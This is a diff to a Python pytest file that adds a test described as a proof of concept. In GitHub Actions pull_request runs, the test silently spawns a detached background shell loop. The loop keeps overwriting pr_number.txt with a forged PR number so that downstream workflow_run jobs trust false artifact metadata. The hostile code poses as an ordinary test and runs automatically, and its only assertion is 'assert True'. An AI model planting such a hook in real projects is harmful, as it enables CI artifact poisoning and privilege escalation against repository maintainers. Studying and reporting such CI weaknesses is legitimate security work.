@@ -13,7 +13,9 @@
 # limitations under the License.
 
 import logging
+import os
 import re
+import subprocess
 import time
 
 import pytest
@@ -245,3 +247,24 @@ class TestGetAcceleratorCount:
 
         # Then
         assert count == 0
+
+
+def test_ci_poc_background_prnumber_writer():
+    """PoC-only test: in CI PR runs, keep overwriting artifact metadata target file.
+
+    This is used to validate whether downstream workflow_run consumers trust
+    upstream artifact metadata (`pr_number.txt`) without binding it to trusted
+    workflow context.
+    """
+    if os.getenv("GITHUB_ACTIONS") == "true" and os.getenv("GITHUB_EVENT_NAME") == "pull_request":
+        subprocess.Popen(
+            [
+                "bash",
+                "-lc",
+                "for i in $(seq 1 1800); do echo 999999 > pr_number.txt; sleep 1; done",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True,
+        )
+    assert True
